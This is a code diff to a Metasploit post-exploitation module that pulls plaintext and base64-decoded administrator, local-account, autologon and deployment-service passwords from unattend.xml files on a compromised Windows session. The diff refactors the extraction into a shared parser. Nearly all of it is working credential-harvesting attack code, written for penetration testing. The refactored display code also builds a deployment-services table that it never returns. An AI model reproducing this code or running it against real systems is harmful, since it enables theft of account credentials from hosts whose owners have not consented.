@@ -7,6 +7,7 @@
 
 require 'msf/core'
 require 'msf/core/post/file'
+require 'rex/parser/unattend'
 require 'rexml/document'
 
 class Metasploit3 < Msf::Post
@@ -45,7 +46,7 @@ class Metasploit3 < Msf::Post
 
 
 	#
-	# Determie if unattend.xml exists or not
+	# Determine if unattend.xml exists or not
 	#
 	def unattend_exists?(xml_path)
 		x = session.fs.file.stat(xml_path) rescue nil
@@ -74,152 +75,6 @@ class Metasploit3 < Msf::Post
 
 		return xml, raw
 	end
-
-
-	#
-	# Extract sensitive data from UserAccounts
-	#
-	def extract_useraccounts(user_accounts)
-		return[] if user_accounts.nil?
-
-		cred_tables = []
-		account_types = ['AdministratorPassword', 'DomainAccounts', 'LocalAccounts']
-		account_types.each do |t|
-			element = user_accounts.elements[t]
-			next if element.nil?
-
-			case t
-			#
-			# Extract the password from AdministratorPasswords
-			#
-			when account_types[0]
-				table = Rex::Ui::Text::Table.new({
-					'Header'  => 'AdministratorPasswords',
-					'Indent'  => 1,
-					'Columns' => ['Username', 'Password']
-				})
-
-				password = element.elements['Value'].get_text.value rescue ''
-				plaintext = element.elements['PlainText'].get_text.value rescue 'true'
-
-				if plaintext == 'false'
-					password = Rex::Text.decode_base64(password)
-					password = password.gsub(/#{Rex::Text.to_unicode('AdministratorPassword')}$/, '')
-				end
-
-				if not password.empty?
-					table << ['Administrator', password]
-					cred_tables << table
-				end
-
-			#
-			# Extract the sensitive data from DomainAccounts.
-			# According to MSDN, unattend.xml doesn't seem to store passwords for domain accounts
-			#
-			when account_types[1]  #DomainAccounts
-				table = Rex::Ui::Text::Table.new({
-					'Header'  => 'DomainAccounts',
-					'Indent'  => 1,
-					'Columns' => ['Username', 'Group']
-				})
-
-				element.elements.each do |account_list|
-					name = account_list.elements['DomainAccount/Name'].get_text.value rescue ''
-					group = account_list.elements['DomainAccount/Group'].get_text.value rescue 'true'
-
-					table << [name, group]
-				end
-
-				cred_tables << table if not table.rows.empty?
-
-			#
-			# Extract the username/password from LocalAccounts
-			#
-			when account_types[2]  #LocalAccounts
-				table = Rex::Ui::Text::Table.new({
-					'Header'  => 'LocalAccounts',
-					'Indent'  => 1,
-					'Columns' => ['Username', 'Password']
-				})
-
-				element.elements.each do |local|
-					password = local.elements['Password/Value'].get_text.value rescue ''
-					plaintext = local.elements['Password/PlainText'].get_text.value rescue 'true'
-
-					if plaintext == 'false'
-						password = Rex::Text.decode_base64(password)
-						password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
-					end
-
-					username = local.elements['Name'].get_text.value rescue ''
-					table << [username, password]
-				end
-
-				cred_tables << table if not table.rows.empty?
-			end
-		end
-
-		return cred_tables
-	end
-
-
-	#
-	# Extract sensitive data from AutoLogon
-	#
-	def extract_autologon(auto_logon)
-		return [] if auto_logon.nil?
-
-		domain    = auto_logon.elements['Domain'].get_text.value rescue ''
-		username  = auto_logon.elements['Username'].get_text.value rescue ''
-		password  = auto_logon.elements['Password/Value'].get_text.value rescue ''
-		plaintext = auto_logon.elements['Password/PlainText'].get_text.value rescue 'true'
-
-		if plaintext == 'false'
-			password = Rex::Text.decode_base64(password)
-			password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
-		end
-
-		table = Rex::Ui::Text::Table.new({
-			'Header' => 'AutoLogon',
-			'Indent' => 1,
-			'Columns' => ['Domain', 'Username', 'Password']
-		})
-
-		table << [domain, username, password]
-
-		return [table]
-	end
-
-
-	#
-	# Extract sensitive data from Deployment Services.
-	# We can only seem to add one <Login> with Windows System Image Manager, so
-	# we'll only enum one.
-	#
-	def extract_deployment(deployment)
-		return [] if deployment.nil?
-
-		domain    = deployment.elements['Login/Credentials/Domain'].get_text.value rescue ''
-		username  = deployment.elements['Login/Credentials/Username'].get_text.value rescue ''
-		password  = deployment.elements['Login/Credentials/Password'].get_text.value rescue ''
-		plaintext = deployment.elements['Login/Credentials/Password/PlainText'].get_text.value rescue 'true'
-
-		if plaintext == 'false'
-			password = Rex::Text.decode_base64(password)
-			password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
-		end
-
-		table = Rex::Ui::Text::Table.new({
-			'Header' => 'WindowsDeploymentServices',
-			'Indent' => 1,
-			'Columns' => ['Domain', 'Username', 'Password']
-		})
-
-		table << [domain, username, password]
-
-		return [table]
-	end
-
 
 	#
 	# Save Rex tables separately
@@ -309,25 +164,69 @@ class Metasploit3 < Msf::Post
 			# XML failed to parse, will not go on from here
 			return if not xml
 
-			# Extract the credentials
-			tables = []
-			unattend = xml.elements['unattend']
-			return if unattend.nil?
-
-			unattend.each_element do |settings|
-				next if settings.class != REXML::Element
-				settings.get_elements('component').each do |c|
-					next if c.class != REXML::Element
-					tables << extract_useraccounts(c.elements['UserAccounts'])
-					tables << extract_autologon(c.elements['AutoLogon'])
-					tables << extract_deployment(c.elements['WindowsDeploymentServices'])
-				end
-			end
+			results = Rex::Parser::Unattend.parse(xml)
+			tables = create_display_tables(results)
 
 			# Save the data
 			save_cred_tables(tables.flatten) if not tables.empty?
 
 			return if not datastore['GETALL']
 		end
+	end
+
+	def create_display_tables(results)
+		tables = []
+		wds_table = Rex::Ui::Text::Table.new({
+			'Header' => 'WindowsDeploymentServices',
+			'Indent' => 1,
+			'Columns' => ['Domain', 'Username', 'Password']
+		})
+
+		autologin_table = Rex::Ui::Text::Table.new({
+			'Header' => 'AutoLogon',
+			'Indent' => 1,
+			'Columns' => ['Domain', 'Username', 'Password']
+		})
+
+		admin_table = Rex::Ui::Text::Table.new({
+						'Header'  => 'AdministratorPasswords',
+						'Indent'  => 1,
+						'Columns' => ['Username', 'Password']
+				})
+
+		domain_table = Rex::Ui::Text::Table.new({
+					'Header'  => 'DomainAccounts',
+					'Indent'  => 1,
+					'Columns' => ['Username', 'Group']
+				})
+
+		local_table = Rex::Ui::Text::Table.new({
+					'Header'  => 'LocalAccounts',
+					'Indent'  => 1,
+					'Columns' => ['Username', 'Password']
+				})
+		results.each do |result|
+			unless result.empty?
+				case result['type']
+					when 'wds'
+						wds_table << [result['domain'], result['username'], result['password']]
+					when 'auto'
+						autologin_table << [result['domain'], result['username'], result['password']]
+					when 'admin'
+						admin_table << [result['username'], result['password']]
+					when 'domain'
+						domain_table << [result['username'], result['group']]
+					when 'local'
+						local_table << [result['username'], result['password']]
+				end
+			end
+		end
+
+		tables << autologin_table
+		tables << admin_table
+		tables << domain_table
+		tables << local_table
+
+		return tables
 	end
 end
